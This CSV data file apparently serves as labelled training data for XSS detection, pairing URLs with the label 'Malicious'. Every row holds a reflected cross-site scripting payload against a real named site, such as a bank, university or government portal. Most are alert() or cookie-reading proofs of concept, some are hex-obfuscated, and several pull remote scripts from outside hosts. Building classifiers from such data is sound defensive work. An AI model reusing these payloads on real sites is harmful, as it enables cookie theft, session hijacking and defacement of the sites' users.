Payloads,Class
"http://www.123helpme.com/search.asp?text=';alert(string.fromcharcode(88,83,83))//\';alert(string.fro<br>mcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.fromcharcode(88,83<br>,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e",Malicious
"http://acikartirma.tr.msn.com/shop/auctions/auctiondetails.aspx?auctionid=8693163&rn=2&stype=finishdate&sorder=asc""><script>alert(document.cookie)</script>",Malicious
http://www.qiaotou.gov.cn/search.asp?field=title&amp;bigclassname=%3cscript%3ealert(%22xss%22)%3c/script<br>%3e&amp;smallclassname=&amp;keyword=xss&amp;submit=%cb%d1%cb%f7,Malicious
http://www.virginradio.fr/recherche/artiste?code=%3cscript%3ealert%281337%29%3c%2fscript%3e%3cmarque<br>e%3e%3ch1%3exss+by+zeryus+%3c%2fh1%3e%3c%2fmarquee%3e&amp;x=0&amp;y=0,Malicious
http://eunis.eea.europa.eu/sites-factsheet.jsp?tab=1&amp;idsite=a00010083%3cscript%3ealert('agd_scorp')%<br>3c/script%3e,Malicious
http://www.eumetsat.int/home/index.htm?l=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.bbcamericashop.com/default.asp?cpa=search&amp;mdm=&amp;fullsearch=0&amp;query=%22%3e%3c%2ftitle%3e%3c<br>%2fscript%3e%3cscript%3ealert%281%29%3c%2fscript%3e+&amp;image1.x=20&amp;image1.y=10&amp;cntry=usa&amp;aff_info=-&amp;qt<br>y=1&amp;command=add,Malicious
http://www.publicarclasificados.com/showcategory.php?cid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;<br>marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.esuj.gr.jp/cgi-local/documentmanager.cgi?md=list&amp;lang=jp'%3e%22%3e'%3e%3cscript%3ealert(%<br>22xss%20by%20kusomiso.com%22)%3c/script%3e,Malicious
http://www.grandballroom.com/content.php?contentid=7&amp;sectionid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scr<br>ipt&gt;,Malicious
http://ms130.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
https://bankingportal.sparkasse-kehl.de/banking/?konto=%22%3e%3ciframe%20src=http://www.google.de%3e,Malicious
http://swiss-bank.bancadelsempione.ch/swiss_bank.php?lang=%22%3e%3cscript%3ealert(/fugitif/)%3c/scri<br>pt%3e,Malicious
http://www.weblandtools.com/signinform.php?msg=%3cscript%3ealert(/xssed/)%3c%2fscript%3e,Malicious
http://www.herkel.net/?menu_id='%3cscript%3ealert(/xxx/)%3c%2fscript%3e&amp;mainmenu_id=0&amp;news_id=253,Malicious
http://www.flower-road.jp/news/a-news.cgi?date=2005.07.31&amp;cal=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%6<br>1%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33<br>%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%<br>2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.360graus.com.br/compras/shopcustadmin.asp?msg=%3cscript%3ealert('by%20s3al%20cyber-unity%<br>2%200team');%3c/script%3e,Malicious
"http://www.faith-go.co.jp/org_pc/details_pc.asp?id=p2912&amp;opid=00015%22%3e'%3e%3c/script%3e%3cscript/<br>src=http://kusomiso.com/xss.js%3e%3c/script%3e00046,00042,00025,00028,00317,00009&amp;opfl=1-1-1,2-1,2-1<br>-1,2,3-1,2,3&amp;series=inspire%20x&amp;sale=",Malicious
http://34gbcrdehull.ca/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+na<br>rcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.wir-sind-bonn.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;ba<br>ckdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://events.i.ua/search/?words=%3c/title%3e%22%3e%3cscript%3ealert('the_miller')%3c/script%3e&amp;type<br>=text,Malicious
"http://www.cimbbank.com.my/index.php?action=search&amp;tl=64&amp;tpt=cimb_bank&amp;st=10&amp;nh=10&amp;md=0&amp;qt=alert(str<br>ing.fromcharcode(88,83,83))//\';alert(string.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(<br>88,83,83))//\%22;alert(string.fromcharcode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert<br>(string.fromcharcode(88,83,83))%3c/script%3e&amp;submit=search&amp;ch=bank_*|subch_*",Malicious
http://www.lib.byu.edu/fhc/%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e%3cmarq<br>uee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
https://myaccount.smartone-vodafone.com/jsp/mya/mya_forpwd.jsp?language=c&amp;sid=&quot;&lt;script&gt;alert(&quot;xssed&quot;<br>)&lt;/script&gt;&amp;subr_num=',Malicious
http://y-click.com/i/index.php?p=news&amp;refid='%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kusomiso.c<br>om%22)%3c/script%3e&amp;afid=,Malicious
http://keepvid.com/?url=http%3a%2f%2fvideo.google.com%2fvideoplay%3fdocid%3d-8714206094109801742%26q<br>%3dtrack%2barte%2bmain%2b2007%26ei%3d1rawsmg3gi382wkwzqqy%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(13<br>37)%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e,Malicious
http://www.ogretmenweb.com/forum/philboard_signup.asp?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&lt;h1&gt;st@rext&lt;/h1&gt;,Malicious
http://flashmobile.adobe.com/ats/public/script/cgi/lv_send_loaderrcv1.cgi?specialchars=%22%3e%3cscri<br>pt%3ealert%28%22xss%22%29%3c/script%3e,Malicious
http://www.thekingpin.net/maps.php?mode=%22%3e%3cscript%3ealert(1)%3c/script%3e,Malicious
http://www.vh1e.com/search.htm?qt=%27%3e%3cscript%3ealert%28%27c4prica+was+here+-+cyber-attack.org%2<br>7%29%3b%3c%2fscript%3e&amp;lang=en&amp;ok.x=0&amp;ok.y=0&amp;ok=search,Malicious
"http://www.scientology.org/churches/churches-of-scientology.html?video=org-cinn_tour"";</script><script>alert(/god hates you !/)</script><iframe src=http://xssed.com/></iframe>",Malicious
http://www.hsbc.com/1/2/!ut/p/kcxml/04_sj9spykssy0xplmnmz0vm0y_qjzkln4o3dpagsygyxqb6kshcbvgocbffj_zc<br>vp0gfw_9ap2c3ncickdhrqdmxovn/delta/base64xml/l3djdyevd0znqufzqumvnelvrs82xzjfmvbl?searchrequest=sear<br>chrequest&amp;querystring=%22%3e%3cscript%3ealert(string.fromcharcode(77%2c114%2c46%2c117%2c78%2c107%2c1<br>10%2c48%2c119%2c78))%3c/script%3e,Malicious
http://www.pgpi.org/cgi/download.cgi?filename=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso%2e<br>com%2fxss%2ejs%3e%3c%2fscript%3e,Malicious
https://onlineinvesting.usbank.com/ncweb/aforgotpwdservlet?action=clientregistration&amp;sub_action=ssnc<br>heck&amp;firm_no=36&amp;acct_no=%22%3e%3cscript%3ealert(%27xss%27)%3c/script%3e&amp;ssn=123456789&amp;zip=12345,Malicious
http://link.aps.org/volpage?journal=prl&amp;volume=%3cscript%3ealert(%2f+the_miller+%2f)%3c%2fscript%3e&amp;<br>id=%3cscript%3ealert(%2f+the_miller+%2f)%3c%2fscript%3e&amp;x=24&amp;y=8,Malicious
http://epaper.vac.gov.tw/admin/web/content.php?mc_sn=45&amp;ts_sn=%3cscript%3ealert(document.cookie);%3c<br>/script%3e,Malicious
http://search.epfl.ch/process?lang=fr&amp;searchdomain=directory&amp;query=%22%3e%3c/title%3e%3cscript%3eale<br>rt(%27airroxssed%27)%3b%3c%2fscript%3e,Malicious
"http://promociones.visa.com/latam/?ss=1&amp;p=1&amp;country=ve&amp;producto=&quot;&gt;&lt;script&gt;alert(string.fromcharcode(<br>88,83,83))&lt;/script&gt;",Malicious
http://www.swi-finance.de/bankentest/index.php?q4_9=%22%3e%3cscript%3ealert(1);%3c/script%3e,Malicious
http://www.forzi.fr/detail.php?id=%22%3e%3cscript%3ealert%281%29%3c/script%3e,Malicious
http://www.starbinary.com/ig/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcotic<br>xs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.berlin.de/stadtplan/list.asp?sid=d58737cb24e8dec338ab9bc2861e97b8&amp;search=cross&amp;city=berli<br>n&amp;plz=&amp;str=%22%3e%3cscript%3ealert%28%22totalschaden%22%29%3c%2fscript%3e&amp;num=,Malicious
http://ms165.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://cards.goodfriday-cards.com/cgi-bin/search/search.pl?log=gfcards&amp;query=%22%3e%3ciframe+src%3dj<br>avascript%3aalert(123)%3e,Malicious
http://etomotors.com/showcategory.php?type=6&amp;keyword=&quot;&gt;&lt;script&gt;alert(backdoor)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://edms.cern.ch/cedar/plsql/cedarw.sub_site?cookie=7799105&amp;p_title=&lt;img<br>&quot;&quot;&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&amp;p_id=top_lhc,Malicious
http://www.genie.x0.com/j.php?id=0042189&amp;u=http://'%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js<br>%3e%3c/script%3e,Malicious
http://cars.mlogic.mobi/vehicle_search_step1.jsp?a=m&amp;type=used%27%22%3e%3c/title%3e%3cscript%3ealert<br>(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://wcrp.wmo.int/search-wcrp?query=%22%3e%3cscript%3ealert(/xss%20by%20warvector/)%3c%2fscript%3e<br>%3ccenter%3e%3cp%20style=background-color:red%20color:white%3e%3cimg%20src=http://warvector.u7n.org/<br>images/logo.gif%3e%3cmarquee%3e%3ch1%3exss%20by%20warvector%20=)%3c/h1%3e%3c/marquee%3e,Malicious
http://c2ch.glorious.mine.nu/orz.cgi/-/kusomiso.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20ku<br>somiso.com%22)%3c/script%3e,Malicious
http://reklam.gittigidiyor.com/iframe/iframejs2.php?id=%3cscript%3ealert(/alert/)%3c/script%3e,Malicious
http://www.bls.gov/search/cgi.asp?qu=%22%3e%3cscript%3ealert%28%27x-turk%21%27%29%3b%3c%2fscript%3e&amp;<br>ct=ooh,Malicious
"http://www.styledash.com/search/?q=%22%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%<br>3e&amp;x=0&amp;y=0",Malicious
http://benq.no/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+nar<br>coticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.camaracaxias.rs.gov.br/imprensatextoimp.php?id=%22%3e'%3e%3cscript%20src=http://vuln.xsse<br>d.net/thirdparty/scripts/python5.js%3e%3c/script%3e,Malicious
"http://www.buy.com/retail/searchresults.asp?querytype=home&amp;qu=%27%27%29%7b%7d%3c/script%3e%3cscript%<br>3ealert(string.fromcharcode(88,83,83))%3c/script%3e&amp;qxt=home&amp;display=col&amp;dclksa=1",Malicious
http://www.benq.com.au/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.thefinemusic.com/shopcustadmin.asp?msg=%3e'%3e%3cscript%20%0a%0d%3ealert(cyber-unity)%3b%<br>3c/script%3e%20%3cscript+src=%22http://cyber-unity.com/x55.js?,Malicious
http://same.ula.cc/test/r.so/%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://www.all-horse-classifieds.com/showcategory.php?type=6&amp;keyword=&quot;&gt;&lt;script&gt;alert(backdoor)&lt;/scri<br>pt&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://freedns.afraid.org/password/?username=\%22%3cinput%3e%22%3cscript%3ealert%281%29;%3c/script%3<br>e,Malicious
http://www.newcracks.net/index.php?shuk=%22%3e'%3e%3cscript%3ealert(%22kusomiso.com%22)%3c/script%3e,Malicious
http://mail.goo.ne.jp/announce/t/index.ghtml?uname=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomi<br>so%2ecom%2fxss%2ejs%3e%3c%2fscript%3e,Malicious
http://www.ch999.com.cn/adminlogin.asp?id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;bac<br>kdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.wauwatosa.net/display/contactus.asp?email=hartpark00@yahoo.com%27%22%3e%3c/title%3e%3cscr<br>ipt%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3<br>e,Malicious
http://www.mobilebulgaria.com/home/poll_results.php?id=%22%3e%3cscript%3ealert(/xssed/);%3c/script%3<br>e,Malicious
http://www.collegefitness.com/error_page.php?code=500&amp;message=%3cscript%3ealert(%27xssed%27)%3c/scri<br>pt%3e,Malicious
http://ct.boincstats.com/stats/project_graph.php?pr='%3e%22%3e%3ciframe%20src=http://kusomiso.com/xs<br>s.html%20%3c,Malicious
http://www.ccgsm.gov.ar/avisos/?menu_id=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://www.torrent-finder.com/show.php?q=%22%3e%27%3e%3cscript%3ealert%28123%29%3c%2fscript%3e%27%22<br>&amp;browse=tabs&amp;pageload=loadall&amp;select=10&amp;sids=1-23-9-2-3-286-5-4-289-7-8-10-30-16-63-15-29-27-24-11-2<br>5-18-34-36-12-19-31-21-35-20-26-32-22-33-251-37-38-60-44-40-253-264-108-46-41-248-294-252-17-45-48-2<br>56-50-53-54-55-56-14-58-51-246-245-61-52-281-64-65-66-275-261-273-67-295-68-226-69-70-72-73-74-75-76<br>-77-78-83-79-80-81-258-84-97-249-279-105-266-87-89-90-92-93-94-95-112-98-99-278-100-101-103-104-106-<br>107-124-287-283-109-262-268-113-114-284-293-274-116-119-263-285-120-282-121-267-110-111-292-244-131-<br>133-57-122-291-125-257-277-126-144-137-139-150-140-145-149-151-152-86-123-132-290-143-142-85-135-141<br>-288-146-147-153-154-134-280-269-271-155-156-157-158-159-160-162-163-164-165-166-167-168-169-,Malicious
http://www.ucop.edu/research/ucmarine/results_all_category.php?category=marine+biotechnology/molecul<br>ar+marine+biology/marine+microbiology%22%3e%3e/r0hit/%3e%3cscript%3ealert(document.cookie)%3c/script<br>%3e%3cscript%20src=http://iblog.ir/style.js%3e%3c/script%3e,Malicious
http://www.bataindia.com/page.php?text=%22%27%3e%3cscript%3ealert%28%27cueballr%27%29%3c%2fscript%3e<br>%3cmarquee%3e%3ch1%3ecueballr%3c%2fh1%3e%3c%2fmarquee%3e&amp;kon=search,Malicious
http://www.megatr.org/ajax.php?do=checkusername&amp;param=ajax.php?do=checkusername&amp;param=%22%3e%3cscrip<br>t%3ealert(1)%3c/script%3e,Malicious
"http://www.yeeongems.com/product_detail.php?id=5&catid=""><script>alert(1)</script>",Malicious
http://www.st-one.com/zoe/blog/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%<br>72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2<br>c%31%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31<br>%35%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
http://schedule.berkeley.edu/filenotfound.aspx?aspxerrorpath=%3cscript%3ealert(1);%3c/script%3e,Malicious
http://www.phileleftheros.com/main/sendtofriend.asp?gid=316&amp;id=0&amp;title=&lt;script&gt;alert(&quot;scriptorium(tu<br>rkey)&quot;)&lt;/script&gt;,Malicious
http://money.dixib.net/search.php?keyword=aaaa%22%3e%3cscript%3ealert(1)%3c/script%3e,Malicious
http://www.politicheagricole.gov.it/motorericerca/risultati?txtquery1=%22%3e%3cscript%3ealert(docume<br>nt.cookie)%3c%2fscript%3e%3cmarquee%3e%3ch1%3exss%20by%20xados%3ch1%3e%3c/marquee%3e&amp;submit=cerca%26<br>aaaa=byxados,Malicious
http://ict.sk3.go.th/web/philboard/philboard_signup.asp?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;&lt;h1&gt;st@rext&lt;/h1&gt;,Malicious
http://search.grippo.com.ar/cgi-ps/ps_query1.cgi?franq=010&amp;country=ar&amp;query=%3e%22%3e%3ctitle%3enore<br>hem%20was%20here%3c/title%3e%3cscript%3ealert('norehem%20was%20here!!')%3c/script%3e%3ch1%3e%3ch1%3e<br>%3ch1%3e%3cmarquee%3enorehem%20was%20here%3c/marquee%3e%3c/h1%3e%3c/h1%3e%3c/h1%3e%3ccenter%3e%3cimg<br>%20src=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3e%3c/center%3e%3cif<br>rame%20src=http://jersain.iespana.es/xss.html%20%3c,Malicious
http://www.123jobs.biz/search_result.php?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br>&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://tabir.net/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.shindai-nav.com/neccomi/cgi/a-news/a-news.cgi?date=2007.11.30&amp;cal=%22%3e%27%3e%3c%73%63%7<br>2%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c<br>%31%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%<br>35%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.radikal.com.tr/arsiv.php?istenen_arsiv_yili=''&gt;&lt;script&gt;alert('xss')&lt;/script&gt;''&gt;&lt;h1&gt;hacked<br>narcoticxs&lt;/h1&gt;,Malicious
http://community.zdnet.co.uk/search/?q=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e&amp;f<br>%5b%5d=members&amp;f%5b%5d=interests&amp;f%5b%5d=biography&amp;f%5b%5d=content&amp;submit.x=25&amp;submit.y=13,Malicious
http://www.bloglines.com/login?r=%22%3e%3cscript%3ealert('xss');%3c/script%3e,Malicious
http://ms116.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://www.sevenbridges.co.th/sbproject/conceptual/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/<br>script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://ayalists.yale.edu/lists/lists.php?id=15%27%22%3e%3cscript%3ealert%28/xss/%29%3c/script%3e,Malicious
http://www.phazemp3.com/search.php?q=%3ch1%3e%3ccenter%3ehacking-gurus%3c%2fcenter%3e%3cbr%3e%3cmarq<br>uee%3edont-mess-with-us%3c%2fmarquee%3e%3c%2fh1%3e,Malicious
http://sheepserver.net/v2d6/cgi/dead.cgi?id=%3cscript%3ealert(123)%3c/script%3e,Malicious
http://e360.yale.edu/mobile/feature.msp?id=2392%27%22%3e%3cscript%3ealert%28/xss/%29%3c/script%3e,Malicious
http://www.wlmorrison.co.uk/shopcustadmin.asp?msg=%3e'%3e%3cscript%20%0a%0d%3ealert(cyber-unity)%3b%<br>3c/script%3e%20%3cscript+src=%22http://cyber-unity.com/x55.js?,Malicious
http://maps.yandex.ru/search-o.xml?text=%22%3e%3cscript%3ealert(/the_miller/)%3c%2fscript%3e%22%3e%3<br>cscript%3e%3cb%3epidaraz%3 c%2fb%3e%3c%2fscript%3e%22%3e%3cscript%3e%3cb%3epi <br>daraz%3c%2fb%3e%3c%2fscript%3e&amp;mapid=900&amp;mapx=6234549&amp;mapy=7279344&amp;scale=3&amp;slices=&amp;distance=&amp;traffic<br>=&amp;g=1.objects.20.10.&amp;g=1.streets.20.200.&amp;how=houses&amp;asc=1,Malicious
http://shopping.msn.com.br/msnshopping/pesquisa.aspx?ds_pesquisa=&quot;&gt;&lt;script&gt;alert(/ras-www.rstzone.or<br>g/)&lt;/script&gt;&amp;cd_departmento=-2&amp;cd_space=-2,Malicious
http://www.hemenpaylasmp3.com/mp3.php?action=category&amp;id=&quot;&gt;&lt;script&gt;alert(/come-back-the-sh0ck-b0y/)&lt;<br>/script&gt;,Malicious
http://www.t2000ultra.com/?rid=%22%3e%3cscript%3ealert%28%2fxss+by+redtuning%2f%29%3b%3c%2fscript%3e,Malicious
http://civs.gouv.fr/spip.php?action=cookie&amp;url=java:%22/%3cscript%3ealert('hello%20the%20rat')%3c/sc<br>ript%3e,Malicious
http://www.english.education.gov.qa/content/general/search?keywords=%3c%2fscript%3e%3cscript%3ealert<br>%28%22noph0bia%22%29%3c%2fscript%3e&amp;x=0&amp;y=0,Malicious
http://www.washingtonpost.com/ac2/related/topic/%22%3e%3cscript%3ealert(%27xssed%27)%3c/script,Malicious
http://www.fullreleases.biz/newmembers/pre_search.php?act=search&amp;act2=src&amp;id=7041&amp;fsize12=5&amp;search=%<br>3ch1%3exss%21%3c%2fh1%3e&amp;submit2=search,Malicious
http://traffic.511.org/traffic_text_incident_detail.asp?id=2012011021102401002%22%3e%20%20%20%20%20%<br>20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2<br>0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<br>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%<br>20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3cscript%2<br>0src=http://lupbot.comule.com/asu_abangjs.php%3e%3c/script%3e,Malicious
http://pipelines.centerpointenergy.com/reports_list.aspx?reporttype=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/scrip<br>t&gt;,Malicious
https://www.e-secure-it.com/alert.asp?alertid=%22%3e%3c/script%3e%3cscript%3ealert(1)%3c/script%3e%3<br>ch1%3ehacked%20by%20trex%3c/h1%3e,Malicious
http://www.sicilynews.com/search-news.cfm?keys=%22%3e%22%3e%3cscript%3ealert(%22scr34m%22);%3c/scrip<br>t%3e&amp;op=and,Malicious
http://www.oppnasverige.gov.se/sb/d/126/a/136/action/search/type/simple;jsessionid=a9uzgreg%22%3e%3c<br>script%3ealert(123)%3c/script%3eu3sns5g?query=reg&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;,Malicious
http://pt.888.com/new888/home.htm?page=gettingstarted&amp;lang=%22%3e%3cscript%3ealert(document.cookie)%<br>3c/script%3e,Malicious
http://www.cort.com/furniture/locator?city=&quot;&gt;&lt;script&gt;alert(&quot;xss found by rugburn with<br>firefox&quot;)&lt;/script&gt;,Malicious
http://www.jeuxvideo.fr/forum/membre-%3cscript%3ealert-1-%3c-script%3e-id3376012.html,Malicious
http://www.trabrennbahn-pfarrkirchen.de/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.szboftec.gov.cn/download/test.php3?a[]=%3cscript%3ealert(/xssed_by_omeha/);%3c/script%3e%<br>3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.kcskspip.gov.pl/harmonogram/index/pl?grupa=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.d<br>omain)%3b%3c/script%3e,Malicious
http://uk.singerspro.com/search_all.php?uid=&amp;name=&amp;keyword='&gt;&lt;script&gt;alert(document.cookie);&lt;/script<br>&gt;,Malicious
http://www.antorchaolimpica.buenosaires.gov.ar/avisos/?menu_id=%22%3e%3cscript%3ealert(/xss/)%3c/scr<br>ipt%3e,Malicious
"http://www.rai.it/rainet/common/articolo/rairedirectvisualizzaarticolo/1,2308,,00.html?canale=1%22%3<br>e%27%27%3e%3cbody%20background=javascript:%27%22%3e%3cscript%3ealert(navigator.useragent)%3c/script%<br>3e%3e%3c/body%3e",Malicious
http://altiumz.sakura.ne.jp/orz/orz.cgi/-/kusomiso.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%2<br>0kusomiso.com%22)%3c/script%3e,Malicious
http://www.city-management-oldenburg.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;ma<br>rquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://libweb1.lib.buffalo.edu/infotree/databasesbytitle.asp?title=y&lt;script&gt;alert(&quot;cyber_thief(turke<br>y)%20hackhaber.com&quot;)&lt;/script&gt;,Malicious
http://cards.hindu-festivals.com/cgi-bin/search/search.pl?log=hindfest&amp;query=%22%3e%3ciframe+src%3dj<br>avascript%3aalert(123)%3e,Malicious
http://j2k.naver.com/j2k_top.php/korean/maps.google.co.jp/maps?hl=ja&amp;q=%22%3e%3cscript%3ealert(1)%3c<br>/script%3e&amp;is_status==%22%3e%3cscript%3ealert(1)%3c/script%3e&amp;&amp;oe=shift_jis&amp;um=1&amp;ie=utf-8&amp;sa=n&amp;tab=w<br>l,Malicious
"http://natolibguides.info/searchtags.php?iid=&amp;tag=%27;alert%28string.fromcharcode%2888,83,83%29%29//<br>\%27;alert%28string.fromcharcode%2888,83,83%29%29//%22;alert%28string.fromcharcode%2888,83,83%29%29/<br>/\%22;alert%28string.fromcharcode%2888,83,83%29%29//--%3e%3c/script%3e%22%3e%27%3e%3cscript%3ealert%<br>28string.fromcharcode%2888,83,83%29%29%3c/script%3e",Malicious
http://jobs.startribune.com/careers/jobsearch/results?searchtype=quick;kandentire=foobar%22%3e%3cscr<br>ipt%3ealert(%27xssed%27)%3c/script%3e;country=united+states,Malicious
http://gmwgroup.harvard.edu/techniques/index.php?topic=http://gmwgroup.harvard.edu/techniques/index.php?topic=<script>alert(document.cookie)</script>,Malicious
http://47.xmbs.jp/login.php?id='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://education.ti.com/educationportal/search/portal_search.do?query=%22%3e%3cmarquee%3e%3ch1%3edef<br>aced%20by%20ironzorg%3c/h1%3e%3c/marquee%3e,Malicious
http://austria.intermaps.com/index_header.asp?chn='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e<br>%3cmarquee%3ewhitehat%20forever%3c/marquee%3e&amp;lang='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3<br>e%3cmarquee%3ewhitehat%20forever%3c/marquee%3e&lt;script&gt;alert(/xss/)&lt;/script&gt;,Malicious
http://it.ask.com/blogsearch?q=ss&amp;t=n&amp;s=r&amp;bql=it%22/xados/%3e%3cscript%3ealert(document.cook <br>ie)%3c/script%3e|--%3cmarquee%3e%3ch3%3exss%20by%20xados%3ch3%3e%3c/marquee%3e,Malicious
http://s.readmej.com/search.cgi?title=on&amp;comment=on&amp;genre=on&amp;key=%22%3e%27%3e%3c%73%63%72%69%70%74%3<br>e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c<br>%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%<br>31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.livrariaultimainstancia.com.br/index.php?inttipopesquisa=1&amp;intidassunto=45&amp;desc=%3cscript<br>%3ealert(666)%3c/script%3e,Malicious
